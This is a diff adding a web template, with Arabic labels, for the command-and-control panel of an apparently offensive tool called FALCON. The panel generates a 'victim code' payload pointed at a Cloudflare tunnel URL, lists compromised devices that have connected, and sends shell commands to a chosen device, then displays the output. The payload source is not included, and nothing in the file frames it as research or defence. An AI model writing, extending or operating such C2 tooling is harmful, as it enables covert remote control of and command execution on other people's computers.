@@ -1,0 +1,97 @@
+{% extends "base.html" %}{% set active='c2' %}
+{% block content %}
+<div class="card" style="border-color:var(--warn); background:linear-gradient(145deg,#1a0a00,#0a0500);">
+<h2 style="color:var(--warn)">💀 الفارس المدمج (Web C2)</h2>
+<p style="color:var(--muted);font-size:13px;">توليد البايلود للتحكم بالأجهزة عبر الإنترنت.</p>
+
+<div class="row">
+  <div><label>رابط FALCON على الإنترنت (Cloudflare)</label>
+    <input id="serverUrl" placeholder="https://random-name.trycloudflare.com" style="width:100%;" value="{{ request.host_url.rstrip('/') }}">
+  </div>
+</div>
+
+<button onclick="generatePayload()" style="width:100%; background:var(--warn); color:#000; font-weight:bold; padding:15px; margin-top:10px;">🛠️ توليد البايلود (كود الضحية)</button>
+<div id="payloadBox" style="display:none; margin-top:10px;">
+    <textarea id="payloadCode" rows="12" style="width:100%; background:#000; color:var(--ok); font-family:monospace; font-size:11px;" readonly></textarea>
+</div>
+</div>
+
+<div class="card">
+<h2>🖥️ الأجهزة المتصلة</h2>
+<button onclick="refreshClients()" style="margin-bottom:10px;">🔄 تحديث</button>
+<div id="clientsList" class="status">لا توجد أجهزة متصلة.</div>
+</div>
+
+<div class="card">
+<h2>💻 إرسال أمر</h2>
+<div class="row">
+  <div><label>اختر الجهاز (ID)</label><select id="targetClient"></select></div>
+</div>
+<div class="row" style="margin-top:10px;">
+  <div><input id="cmdInput" placeholder="whoami"></div>
+  <div><button onclick="sendCmd()" style="background:var(--ok); color:#000;">إرسال</button></div>
+</div>
+<div id="resultBox" class="status" style="display:none; margin-top:12px; background:#000; padding:10px; border-radius:8px; font-family:monospace; color:var(--ok); white-space:pre-wrap; max-height:200px; overflow-y:auto;"></div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+async function generatePayload() {
+    const serverUrl = document.getElementById("serverUrl").value.trim();
+    if(!serverUrl) { alert("أدخل رابط الخادم أولاً"); return; }
+    
+    const res = await fetch("/api/web_c2/generate_payload?server=" + encodeURIComponent(serverUrl));
+    const data = await res.json();
+    
+    if(data.success) {
+        document.getElementById("payloadBox").style.display = "block";
+        document.getElementById("payloadCode").value = data.payload;
+    }
+}
+
+async function refreshClients() {
+    const res = await fetch("/api/web_c2/clients");
+    const clients = await res.json();
+    const select = document.getElementById("targetClient");
+    const list = document.getElementById("clientsList");
+    
+    select.innerHTML = "";
+    if(clients.length === 0) { list.innerHTML = "لا توجد أجهزة متصلة."; return; }
+    
+    let html = "";
+    clients.forEach(c => {
+        select.innerHTML += `<option value="${c}">${c}</option>`;
+        html += `<div class="list-item">🖥️ ${c}</div>`;
+    });
+    list.innerHTML = html;
+}
+
+async function sendCmd() {
+    const client = document.getElementById("targetClient").value;
+    const cmd = document.getElementById("cmdInput").value;
+    if(!client || !cmd) { alert("اختر جهازاً وأدخل أمراً"); return; }
+    
+    await fetch("/api/web_c2/send", {
+        method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({client_id: client, cmd})
+    });
+    
+    setTimeout(loadResults, 2000);
+}
+
+async function loadResults() {
+    const client = document.getElementById("targetClient").value;
+    if(!client) return;
+    const res = await fetch("/api/web_c2/results?client_id=" + client);
+    const results = await res.json();
+    const box = document.getElementById("resultBox");
+    if(results.length > 0) {
+        box.style.display = "block";
+        box.textContent = results[results.length - 1];
+    }
+}
+
+refreshClients();
+setInterval(refreshClients, 10000);
+</script>
+{% endblock %}
